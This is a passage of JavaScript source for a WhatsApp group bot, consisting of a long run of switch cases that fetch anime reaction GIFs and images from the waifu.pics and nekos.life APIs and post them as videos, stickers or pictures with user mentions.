        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} spanked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'feed': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} fed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'tickle': {

        if (!m.isGroup) return reply("This command is for group use only.")
        if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} tickled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          EliteProEmpire.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
EliteProEmpire.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'animeawoo':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await EliteProEmpire.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
